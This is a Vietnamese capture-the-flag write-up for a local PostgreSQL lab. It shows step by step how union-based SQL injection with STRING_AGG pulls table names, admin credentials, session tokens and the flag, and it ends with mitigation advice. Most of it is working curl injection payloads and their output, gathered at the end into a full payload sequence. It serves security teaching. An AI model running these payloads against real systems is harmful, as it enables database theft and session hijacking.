# SQLi-022: PostgreSQL Union-based Multi Row - Complete Writeup

## 📋 Tóm Tắt

Bài lab này yêu cầu khai thác SQL Injection trên PostgreSQL sử dụng kỹ thuật **Union-based** với `STRING_AGG()` để aggregate nhiều rows thành 1 string.

**Độ khó:** Hard (⭐⭐⭐)  
**Kỹ thuật:** PostgreSQL Union-based với STRING_AGG  
**Mục tiêu:** Trích xuất flag và session tokens từ bảng `admin_credentials`

---

## 🔍 Bước 1: DETECT - Tìm Điểm Chèn

### 1.1 Khám phá ứng dụng

Truy cập URL: `http://localhost:5022/`

Corporate Directory hiển thị danh sách nhân viên theo phòng ban:

```
http://localhost:5022/department?id=1
```

**Response:** Hiển thị department info và list employees.

### 1.2 Phát hiện SQL Injection

```bash
# Test 1: Single quote
curl "http://localhost:5022/department?id=1'"
# ❌ Error: syntax error at or near "'"

# Test 2: Boolean logic
curl "http://localhost:5022/department?id=1 AND 1=1"
# ✅ Hiển thị employees bình thường

curl "http://localhost:5022/department?id=1 AND 1=2"
# ❌ Không có employees
```

**Kết luận:** SQL Injection xác nhận!

---

## 🎯 Bước 2: IDENTIFY - Xác Định Database

### 2.1 Xác định DBMS từ error

```bash
curl "http://localhost:5022/department?id=1'"
```

**Error:**
```
ERROR: syntax error at or near "'"
LINE 1: ...E name, email, position FROM employees WHERE department_id = 1'
```

→ **PostgreSQL** (ERROR:..., LINE:... format)

### 2.2 Xác nhận với PostgreSQL-specific

```bash
# PostgreSQL dùng || cho concatenation
curl "http://localhost:5022/department?id=1 AND 'a'||'b'='ab'"
# ✅ Works
```

---

## 🔢 Bước 3: ENUMERATE - Liệt Kê Cấu Trúc

### 3.1 Xác định số columns

```bash
# Query employees có 3 columns (name, email, position)
curl "http://localhost:5022/department?id=0 UNION SELECT NULL,NULL,NULL--"
# ✅ Hoạt động

curl "http://localhost:5022/department?id=0 UNION SELECT NULL,NULL,NULL,NULL--"
# ❌ Error: columns mismatch
```

→ Query trả về **3 columns**!

### 3.2 Xác định data types

```bash
# Test string columns
curl "http://localhost:5022/department?id=0 UNION SELECT 'name1','email1','pos1'--"
# ✅ Hiển thị employee với data injected
```

### 3.3 Enumerate current user

```bash
curl "http://localhost:5022/department?id=0 UNION SELECT current_user,'','--"
# Result: name=postgres
```

### 3.4 Enumerate tables

```bash
# PostgreSQL: information_schema.tables
curl "http://localhost:5022/department?id=0 UNION SELECT STRING_AGG(table_name,','),'','' FROM information_schema.tables WHERE table_schema='public'--"
```

**Result:**
```
name: departments,employees,admin_credentials,flags
```

### 3.5 Enumerate columns trong admin_credentials

```bash
curl "http://localhost:5022/department?id=0 UNION SELECT STRING_AGG(column_name,','),'','' FROM information_schema.columns WHERE table_name='admin_credentials'--"
```

**Result:**
```
name: id,username,password,role,session_token
```

---

## 📤 Bước 4: EXTRACT - Lấy Dữ Liệu

### 4.1 Vấn đề: Nhiều admin credentials

Query trả về nhiều rows, cần aggregate.

### 4.2 Giải pháp: STRING_AGG

PostgreSQL dùng `STRING_AGG(expression, delimiter)`:

```bash
# Lấy tất cả username:password
curl "http://localhost:5022/department?id=0 UNION SELECT STRING_AGG(username||':'||password,'<br>'),'','' FROM admin_credentials--"
```

**Result:**
```
sysadmin:P0stgr3s_Sup3r_Adm1n!<br>dbadmin:DB_Adm1n_P@ssw0rd<br>hr_admin:HR_Acc3ss_2024<br>backup_user:B@ckup_Cr3d3nt1als!
```

### 4.3 Lấy thông tin đầy đủ

```bash
curl "http://localhost:5022/department?id=0 UNION SELECT STRING_AGG(username||' | '||password||' | '||role,'<br>'),'','' FROM admin_credentials--"
```

**Result:**
```
sysadmin | P0stgr3s_Sup3r_Adm1n! | superadmin
dbadmin | DB_Adm1n_P@ssw0rd | admin
hr_admin | HR_Acc3ss_2024 | admin
backup_user | B@ckup_Cr3d3nt1als! | backup
```

---

## ⬆️ Bước 5: ESCALATE - Leo Thang Quyền

### 5.1 Extract Session Tokens

```bash
curl "http://localhost:5022/department?id=0 UNION SELECT STRING_AGG(username||':'||session_token,'<br>'),'','' FROM admin_credentials--"
```

**Result:**
```
sysadmin:sess_abc123def456ghi789jkl012mno345pqr678stu901
dbadmin:sess_xyz987wvu654tsr321qpo098nml765kji432fed109
hr_admin:sess_qwe456rty789uio012pas345dfg678hjk901lzx234
backup_user:sess_mnb098vcx765zaq432wsx109edc876rfv543tgb210
```

### 5.2 Highest privilege account

```
sysadmin:P0stgr3s_Sup3r_Adm1n! (role: superadmin)
Session: sess_abc123def456ghi789jkl012mno345pqr678stu901
```

→ Session token có thể được sử dụng để hijack session!

---

## 🏆 Bước 6: EXFILTRATE - Trích Xuất Flag

### 6.1 Lấy flag từ bảng flags

```bash
curl "http://localhost:5022/department?id=0 UNION SELECT STRING_AGG(name||':'||value,','),'','' FROM flags--"
```

**Result:**
```
sqli_022:FLAG{str1ng_4gg_p0stgr3sql}
```

### 6.2 Lấy trực tiếp value

```bash
curl "http://localhost:5022/department?id=0 UNION SELECT value,'','' FROM flags WHERE name='sqli_022'--"
```

**Result:**
```
FLAG{str1ng_4gg_p0stgr3sql}
```

🎉 **FLAG:** `FLAG{str1ng_4gg_p0stgr3sql}`

---

## 📝 Summary of Exploitation Chain

```
1. DETECT      → Single quote triggers PostgreSQL error
2. IDENTIFY    → PostgreSQL (ERROR:... format)
3. ENUMERATE   → 3 columns, 4 tables (using STRING_AGG)
4. EXTRACT     → STRING_AGG + || for all credentials
5. ESCALATE    → Found sysadmin superadmin + session tokens
6. EXFILTRATE  → FLAG{str1ng_4gg_p0stgr3sql}
```

**Complete Payload Sequence:**

```bash
# Step 1: Detect SQLi
curl "http://localhost:5022/department?id=1'"

# Step 2: Find column count
curl "http://localhost:5022/department?id=0 UNION SELECT NULL,NULL,NULL--"

# Step 3: Enumerate tables
curl "http://localhost:5022/department?id=0 UNION SELECT STRING_AGG(table_name,','),'','' FROM information_schema.tables WHERE table_schema='public'--"

# Step 4: Enumerate columns
curl "http://localhost:5022/department?id=0 UNION SELECT STRING_AGG(column_name,','),'','' FROM information_schema.columns WHERE table_name='admin_credentials'--"

# Step 5: Extract all credentials
curl "http://localhost:5022/department?id=0 UNION SELECT STRING_AGG(username||':'||password||':'||session_token,'<br>'),'','' FROM admin_credentials--"

# Step 6: Get flag
curl "http://localhost:5022/department?id=0 UNION SELECT value,'','' FROM flags--"
```

---

## 🎓 Bài Học Quan Trọng

### 1. STRING_AGG vs GROUP_CONCAT

| Feature     | PostgreSQL STRING_AGG         | MySQL GROUP_CONCAT                    |
| ----------- | ----------------------------- | ------------------------------------- |
| Syntax      | STRING_AGG(col, delim)        | GROUP_CONCAT(col SEPARATOR delim)     |
| ORDER BY    | STRING_AGG(col, delim ORDER BY...) | GROUP_CONCAT(col ORDER BY...) |
| DISTINCT    | STRING_AGG(DISTINCT col, delim) | GROUP_CONCAT(DISTINCT col)          |
| Availability | PostgreSQL 9.0+              | MySQL all versions                    |

### 2. PostgreSQL-specific Syntax

```sql
-- Concatenation (dùng ||, không phải CONCAT)
SELECT username || ':' || password FROM admin;

-- Version
SELECT version();

-- Current database
SELECT current_database();

-- Current user
SELECT current_user;
```

### 3. PostgreSQL System Tables

```sql
-- Tables (alternative to information_schema)
SELECT tablename FROM pg_tables WHERE schemaname='public';

-- Columns
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

---

## 🛡️ Cách Phòng Chống

### 1. Parameterized Queries

```python
# ❌ Vulnerable
sql = f"SELECT name, email, position FROM employees WHERE department_id = {dept_id}"

# ✅ Secure
sql = "SELECT name, email, position FROM employees WHERE department_id = %s"
cursor.execute(sql, (dept_id,))
```

### 2. Input Validation

```python
if not dept_id.isdigit():
    return "Invalid department ID", 400
```

---

## 📚 References

- [PostgreSQL STRING_AGG](https://www.postgresql.org/docs/15/functions-aggregate.html)
- [PostgreSQL SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
- [PayloadsAllTheThings - PostgreSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)

---

## ✅ Flag

```
FLAG{str1ng_4gg_p0stgr3sql}
```

**Ý nghĩa:**
- `str1ng` → string (leet: i=1)
- `4gg` → agg (aggregate, leet: a=4)
- `p0stgr3sql` → postgresql (leet: o=0, e=3)

---

**🎯 Completed:** SQLi-022 - PostgreSQL Union-based Multi Row Exploitation
